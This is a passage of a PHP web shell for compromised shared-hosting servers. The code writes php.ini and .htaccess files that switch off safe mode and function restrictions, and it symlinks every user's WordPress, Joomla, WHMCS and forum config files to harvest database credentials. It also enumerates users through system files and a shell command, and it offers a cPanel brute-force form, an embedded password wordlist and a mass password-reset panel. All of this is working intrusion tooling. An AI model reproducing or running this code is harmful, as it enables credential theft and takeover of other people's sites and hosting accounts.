YmluDQpkZWxwaWVybw0KZGVyaWNrDQpjeXBydXMNCmRhbnRlMQ0KZGF2ZTENCm5vdW5vdXJzDQpuZWFsDQpuZXh1czYNCm5lcm8NCm5vZ2FyZA0Kbm9yZm9saw0KYnJlbnQxDQpib295YWgNCmJvb3RsZWcNCmJ1Y2thcm9vDQpidWxsczIzDQpidWxsczENCmJvb3Blcg0KaGVyZXRpYw0KaWNlY3ViZQ0KaGVsbG5vDQpob3VuZHMNCmhvbmV5ZGV3DQpob290ZXJzMQ0KaG9lcw0KaG93aWUNCmhldm5tNA0KaHVnb2h1Z28NCmVpZ2h0eQ0KZXBzb24NCmV2YW5nZWxpDQplZWVlZTENCmV5cGhlZA==";
$wl = base64_decode($wordlist);
echo"<center><br><br><b>+--=[ Collection +10k Wordlist by X'1N73CT ]=--+</b><br><br>
<textarea style=\"background:black;outline:none;\" cols=\"90\" rows=\"20\" name=\"usernames\">";
echo $wl;
echo"</textarea>
</center><br>";
echo "<hr><center><b><a href=".$_SERVER['PHP_SELF']."> << BACK</a>";
exit;
}
if($_POST['matikan']=='sekatan'){
@error_reporting(0);
$phpini =
'c2FmZV9tb2RlPU9GRg0KZGlzYWJsZV9mdW5jdGlvbnM9Tk9ORQ==';
$file = fopen("php.ini","w+");
$write = fwrite ($file ,base64_decode($phpini));
fclose($file);
$htaccess =
'T3B0aW9ucyBGb2xsb3dTeW1MaW5rcyBNdWx0aVZpZXdzIEluZGV4ZXMgRXhlY0NHSQ==';
$file = fopen(".htaccess","w+");
$write = fwrite ($file ,base64_decode($htaccess));
echo "<hr><center><b>DONE!";
echo "<hr><center><b><a href=".$_SERVER['PHP_SELF'].">BACK</a>";
exit;
}
if($_POST['mendapatkan']=='passwd'){
@set_magic_quotes_runtime(0);
ob_start();
error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
$fn = $_POST['foldername'];
//all function here

function syml($usern,$pdomain)
	{
		symlink('/home/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home2/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home2/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home2/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home2/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home2/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home2/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home2/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home2/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home2/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home2/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home2/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home2/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home2/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home2/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home2/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home2/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home2/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home2/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home2/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home2/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home2/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home2/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home2/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home2/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home2/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home2/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home3/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home3/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home3/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home3/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home3/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home3/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home3/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home3/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home3/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home3/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home3/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home3/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home3/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home3/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home3/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home3/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home3/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home3/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home3/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home3/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home3/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home3/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home3/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home3/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home3/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home3/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home4/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home4/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home4/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home4/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home4/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home4/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home4/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home4/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home4/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home4/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home4/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home4/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home4/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home4/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home4/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home4/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home4/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home4/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home4/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home4/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home4/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home4/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home4/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home4/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home4/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home4/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home5/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home5/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home5/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home5/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home5/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home5/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home5/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home5/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home5/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home5/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home5/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home5/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home5/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home5/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home5/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home5/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home5/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home5/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home5/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home5/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home5/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home5/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home5/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home5/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home5/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home5/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home6/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home6/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home6/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home6/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home6/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home6/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home6/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home6/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home6/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home6/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home6/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home6/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home6/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home6/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home6/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home6/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home6/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home6/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home6/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home6/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home6/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home6/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home6/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home6/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home6/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home6/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home7/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home7/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home7/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home7/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home7/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home7/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home7/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home7/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home7/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home7/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home7/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home7/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home7/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home7/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home7/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home7/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home7/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home7/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home7/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home7/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home7/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home7/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home7/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home7/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home7/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home7/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
	}

				$domains = @file("/etc/named.conf");
		
				if($domains)
				{
					mkdir($fn);
					chdir($fn);
										
					foreach($domains as $d0main)
					{
						if(eregi("zone",$d0main))
						{
							preg_match_all('#zone "(.*)"#', $d0main, $domains);
							flush();
								
							if(strlen(trim($domains[1][0])) > 2)
							{ 
								$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
								
								syml($user['name'],$domains[1][0]);					
							}
						}
					}
					echo "<center><font color=lime size=3>[ Done ]</font></center>";
					echo "<br><center><a href=$fn/ target=_blank><font size=3 color=#009900>| Go Here |</font></a></center>"; 
				}
				else
				{
					mkdir($fn);
					chdir($fn);
					$temp = "";
					$val1 = 0;
					$val2 = 1000;
					for(;$val1 <= $val2;$val1++) 
					{
						$uid = @posix_getpwuid($val1);
						if ($uid)
							$temp .= join(':',$uid)."\n";
					 }
					 echo '<br/>';
					 $temp = trim($temp);
					 
					 $file5 = fopen("test.txt","w");
					 fputs($file5,$temp);
					 fclose($file5);

$htaccess =
'T3B0aW9ucyBhbGwgCkRpcmVjdG9yeUluZGV4IHJlYWRtZS5odG1sIApBZGRUeXBlIHRleHQvcGxh
aW4gLnBocCAKQWRkSGFuZGxlciBzZXJ2ZXItcGFyc2VkIC5waHAgCkFkZFR5cGUgdGV4dC9wbGFp
biAuaHRtbCAKQWRkSGFuZGxlciB0eHQgLmh0bWwgClJlcXVpcmUgTm9uZSAKU2F0aXNmeSBBbnk=
';
$file = fopen(".htaccess","w+");
$write = fwrite ($file ,base64_decode($htaccess));
					 
					 $file = fopen("test.txt", "r") or exit("Unable to open file!");
					 while(!feof($file))
					 {
						$s = fgets($file);
						$matches = array();
						$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
						$matches = str_replace("home/","",$matches[1]);
						if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
							continue;
						syml($matches,$matches);
					 }
					fclose($file);
					echo "</table>";
					unlink("test.txt");
					echo "<center><font color=lime size=3>[ Done ]</font></center>";
					echo "<br><center><a href=$fn/ target=_blank><font size=3 color=#009900>| Go Here |</font></a></center>"; 
				}
echo "<hr><center><b><a href=".$_SERVER['PHP_SELF']."><< BACK</a>";
exit;
}
?>
<form method="POST" target="_blank">
	<strong>
<input name="page" type="hidden" value="find"><table>      				
    </strong><br><br><center><font size="5" align="center" style="italic" color="#00ff00">+--=[ Cpanel BruteForce ]=--+</font></center><br>
    <table width="600" border="0" class="tabnet" cellpadding="3" cellspacing="1" align="center">
	<tr>
	<td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
	<center><b><font size="5" style="italic" color="#00ff00">[ Cpanel Brute Force ]</font></b></center></td></tr>
    <tr>
    <td>
    <table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
    <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
	<strong>Username List :</strong></td>
    <td valign="top" bgcolor="#151515" colspan="5"><strong><textarea cols="79" class ='inputz' rows="10" name="usernames"><?php system('ls /var/mail');?></textarea></strong></td>
    </tr>
    <tr>
    <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
	<strong>Password List :</strong></td>
    <td valign="top" bgcolor="#151515" colspan="5"><strong><textarea cols="79" class ='inputz' rows="10" name="passwords"></textarea></strong></td>
    </tr>
    <tr>
    <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
	<strong>Type :</strong></td>
    <td valign="top" bgcolor="#151515" colspan="5">
    <span class="style2"><strong>Simple : </strong> </span>
	<strong>
	<input type="radio" name="type" value="simple" checked="checked" class="style3"></strong>
    <font class="style2"><strong>/etc/passwd : </strong> </font>
	<strong>
	<input type="radio" name="type" value="passwd" class="style3"></strong><span class="style3"><strong>
	</strong>
	</span>
    </td>
    </tr>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"></td>
    <td valign="top" bgcolor="#151515"  colspan="5"><strong><input class ='inputzbut' type="submit" value="Start">
    </strong>
    </td>
    <tr>
</form> 
<tr>
    <td valign="top" bgcolor="#151515" class="style1" colspan="6"><center><strong>[ Get Config ]</strong></center></td>
    				</tr>
<form method="POST" target="_blank">
	<strong>
<input name="mendapatkan" type="hidden" value="passwd">        				
    </strong>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Folder Name :</strong></td>
    <td valign="top" bgcolor="#151515"><strong><input class ='inputz' size="50" name="foldername" type="text"></strong></td>
	</strong>
    </td>
    </tr>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"></td>
    <td valign="top" bgcolor="#151515" colspan="5"><strong><input class ='inputzbut' type="submit" value="GO">
    </strong>
    </td>
    <tr>
</form>   
<tr>
    <td valign="top" bgcolor="#151515" class="style1" colspan="6"><center><strong>[ Get Wordlist ]</strong></center></td>
    				</tr>
<form method="POST" target="_blank">
	<strong>
<input name="pass" type="hidden" value="password">        				
    </strong>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Url Config :</strong></td>
    <td valign="top" bgcolor="#151515"><strong><input class ='inputz' size="50" name="url" type="text" value="http://www."></strong></td>
	</strong>
    </td>
    </tr>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"></td>
    <td valign="top" bgcolor="#151515" colspan="5"><strong><input class ='inputzbut' type="submit" value="GO">
    </strong>
    </td>
    <tr>
</form>
<tr>
    <td valign="top" bgcolor="#151515" class="style1" colspan="6"><center><strong>[ Collection Wordlist ]</strong></center></td>
    				</tr>
<form method="POST" target="_blank">
	<strong>
<input name="passlis" type="hidden" value="passwordlis">        				
    </strong>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Wordlist by X'1N73CT :</strong></td>
    <td valign="top" bgcolor="#151515" style="width: 139px"></td>
	</td>
    </tr>
	<tr><td valign="top" bgcolor="#151515" style="width: 139px"></td>
	<td valign="top" bgcolor="#151515" colspan="5"><strong><input class ='inputzbut' type="submit" value="Wordlist"></strong></td>
	</strong>
    </td>
    <tr></form>
<tr>
    <td valign="top" bgcolor="#151515" class="style1" colspan="6"><center><strong>[ Info 
	Security ]</strong></center></td>
    				</tr>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Safe Mode :</strong></td>
    <td valign="top" bgcolor="#151515" colspan="5">
	<strong>
<?php
$safe_mode = ini_get('safe_mode'); if($safe_mode=='1') { echo 'ON'; }else{ echo 'OFF'; }
?>	
	</strong>	
	</td>
    				</tr>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Desible Function :</strong></td>
    <td valign="top" bgcolor="#151515" colspan="5">
	<strong>
<form method="POST" target="_blank">
	<strong>
<input name="matikan" type="hidden" value="sekatan">        				
    </strong>

<?php
if(''==($func=@ini_get('disable_functions')))
{
echo "<font color=#00ff00>No Security for Function</font></b>";
}else{
echo '<script>alert("Please see below and press >Please Click Here First!<");</script>';
echo "<font color=red>$func</font></b>";
echo '<tr><td valign="top" bgcolor="#151515" style="width: 139px"></td>';
echo '<td valign="top" bgcolor="#151515" colspan="5"><strong><input type="submit" value="Please Click Here First!">
    </strong>
    </td></tr>';
}
?></strong></td></tr></table></table></table>
<?php
}
///////////////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'mass_pass'))
    {@ini_set('output_buffering',0); 
?>
<form action="?y=<?php echo $pwd; ?>&x=mass_pass" method="post">
<br><br><center><b><font size=4>+--=[ Multi Reset Password ]=--+</font></b></center>
	<form method=post><br><center><table class='tabnet'>
	<tr><th colspan='5'><b>Multi Reset Password</b></th></tr>
	<tr><th><b>Mass Passsword</b></th><th><b>WHMCS ResPass</b></th><th><b>Joomla ResPass</b></th><th><b>Wordpress ResPass</b></th></b></tr>
	<tr><td><input class='inputzbut' type='submit'name='respass' value="Mass Passsword" /></td><td>
	<input class='inputzbut' type='submit' name='whmcs' value="WHMCS ResPass" /></td><td>
	<input class='inputzbut' type='submit' name='jm-reset' value="Joomla ResPass" /></td><td>
